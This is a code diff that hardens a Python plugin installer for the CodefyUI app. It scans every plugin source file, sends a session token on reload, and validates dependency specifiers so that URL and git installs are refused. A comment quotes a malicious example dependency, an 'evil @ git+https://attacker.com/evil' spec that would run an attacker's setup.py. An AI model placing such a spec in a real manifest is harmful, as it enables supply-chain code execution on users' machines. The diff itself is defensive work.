@@ -229,19 +229,83 @@ def validate_nodes_dir(nodes_dir: Path, allowed_modules: list[str]) -> None:
         validate_python_source(content, py.name, allowed_modules=allowed_modules)
 
 
+# Directories within an extracted plugin tarball that are *not* imported as
+# Python at runtime — safe to skip the AST gate. Everything else (top-level
+# helpers, sub-packages other than ``nodes/``) gets scanned because the
+# plugin loader exposes the entire plugin dir as a namespace package, so
+# ``from .. import _helpers`` from inside ``nodes/foo.py`` would otherwise
+# pull in unscanned code.
+_VALIDATION_SKIP_DIRS = frozenset({
+    "examples", "assets", "tests", "__pycache__", ".git", "docs",
+})
+
+
+def validate_plugin_dir(plugin_root: Path, allowed_modules: list[str]) -> None:
+    """Walk the entire plugin directory and validate every Python source file.
+
+    The original ``validate_nodes_dir`` only checked ``nodes/`` which left a
+    bypass via top-level helpers. This visits all ``.py`` files except those
+    in test / docs / asset directories that aren't part of the import graph.
+    """
+    if not plugin_root.exists():
+        return
+    root_resolved = plugin_root.resolve()
+    for py in sorted(plugin_root.rglob("*.py")):
+        rel_parts = py.resolve().relative_to(root_resolved).parts
+        if any(part in _VALIDATION_SKIP_DIRS for part in rel_parts):
+            continue
+        content = py.read_bytes()
+        if not content.strip():
+            continue
+        validate_python_source(content, py.name, allowed_modules=allowed_modules)
+
+
 # ── runtime helpers ────────────────────────────────────────────────────────
 
 def now_iso() -> str:
     return datetime.now(timezone.utc).isoformat()
 
 
+def _read_session_token() -> str | None:
+    """Read the running server's session token from the local file.
+
+    Returns ``None`` when the file is missing — typically because the server
+    isn't running yet. ``_backend_reload`` treats that case as "skip the
+    hot reload" rather than failing the install, so the user can still
+    ``cdui start`` afterwards and pick up the new plugin.
+    """
+    try:
+        from platformdirs import user_data_dir
+    except ImportError:
+        return None
+    p = Path(user_data_dir("codefyui", appauthor=False)) / "session.token"
+    try:
+        return p.read_text(encoding="ascii").strip()
+    except (OSError, UnicodeDecodeError):
+        return None
+
+
 def _backend_reload() -> bool:
-    """POST /api/plugins/reload — best-effort hot reload."""
+    """POST /api/plugins/reload — best-effort hot reload.
+
+    The server requires a session token on mutating endpoints (see
+    auth_guard middleware). The token is rotated per-process and persisted
+    to a 0600 file in the user data dir; we read it back here so plugin
+    install / uninstall keeps working without manual configuration.
+    """
+    token = _read_session_token()
+    if token is None:
+        return False
     try:
         req = urllib.request.Request(
             "http://127.0.0.1:8000/api/plugins/reload",
             method="POST",
-            headers={"User-Agent": USER_AGENT, "Content-Length": "0"},
+            headers={
+                "User-Agent": USER_AGENT,
+                "Content-Length": "0",
+                "X-CodefyUI-Token": token,
+                "Host": "127.0.0.1:8000",  # Match the Host whitelist.
+            },
             data=b"",
         )
         with urllib.request.urlopen(req, timeout=5.0):
@@ -250,19 +314,64 @@ def _backend_reload() -> bool:
         return False
 
 
+# PEP 508 distribution names: letters / digits / underscore / hyphen / period.
+# Anything else (especially ``@``, ``git+``, ``http``, whitespace, semicolon)
+# is rejected to block supply-chain RCE via the dep installer
+# (``"evil @ git+https://attacker.com/evil"`` → ``uv pip install`` runs the
+# attacker's ``setup.py`` regardless of how strict the AST gate is).
+_SAFE_DEP_NAME = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,62}$")
+
+# PEP 440 version specifier characters. We don't fully parse — we just refuse
+# anything that *isn't* whitespace, digits, dots, commas, parens, and the
+# canonical comparison operators.
+_SAFE_DEP_VERSION = re.compile(r"^[\s\d.,()<>=!~*+a-zA-Z\-]*$")
+
+
+class _UnsafeDepSpec(ValueError):
+    """Raised when a plugin manifest's python_deps entry isn't a plain
+    distribution name + version constraint."""
+
+
+def _build_dep_spec(name: str, ver: str) -> str:
+    """Turn a (name, version) pair into a vetted ``foo==1.2.3``-style string.
+
+    Rejects PEP 508 extras (``foo[extra]``), URL specifiers (``foo @ url``),
+    and any name with non-distribution-safe characters. Returning the spec as
+    a list element for ``uv pip install`` is safe because we never invoke a
+    shell — but ``uv`` itself would happily fetch ``git+`` URLs given the
+    chance, and that's exactly what we're blocking here.
+    """
+    if not isinstance(name, str) or not _SAFE_DEP_NAME.match(name):
+        raise _UnsafeDepSpec(
+            f"Invalid python_deps name {name!r} — must match {_SAFE_DEP_NAME.pattern!r}"
+        )
+    if not isinstance(ver, str):
+        ver = ""
+    if ver and not _SAFE_DEP_VERSION.match(ver):
+        raise _UnsafeDepSpec(
+            f"Invalid python_deps version constraint for {name!r}: {ver!r}"
+        )
+    if not ver:
+        return name
+    if ver[:1] in (">", "<", "=", "~", "!"):
+        return f"{name}{ver}"
+    return f"{name}=={ver}"
+
+
 def _install_deps(deps: dict[str, str]) -> int:
     """Install ``python_deps`` via ``uv pip`` into the codefyui venv."""
     specs: list[str] = []
     for name, ver in deps.items():
-        if not isinstance(ver, str):
-            ver = ""
-        if ver and ver[:1] not in (">", "<", "=", "~", "!"):
-            specs.append(f"{name}=={ver}")
-        elif ver:
-            specs.append(f"{name}{ver}")
-        else:
-            specs.append(name)
+        try:
+            specs.append(_build_dep_spec(name, ver))
+        except _UnsafeDepSpec as e:
+            err(str(e), str(e))
+            return 1
     cmd = ["uv", "pip", "install", *specs]
+    info(
+        f"執行：{' '.join(cmd)}",
+        f"Running: {' '.join(cmd)}",
+    )
     try:
         r = subprocess.run(cmd, check=False)
     except FileNotFoundError:
@@ -430,7 +539,11 @@ def _install_github(owner: str, repo: str, ref: str, args, lockfile) -> int:
             return 1
 
         try:
-            validate_nodes_dir(root / "nodes", allowed)
+            # Validate the *entire* extracted tarball, not just nodes/. The
+            # plugin loader exposes the plugin root as a namespace package so
+            # ``from .. import helper`` from a node would otherwise import
+            # unscanned helpers.
+            validate_plugin_dir(root, allowed)
         except PluginValidationError as e:
             err(str(e), str(e))
             return 1
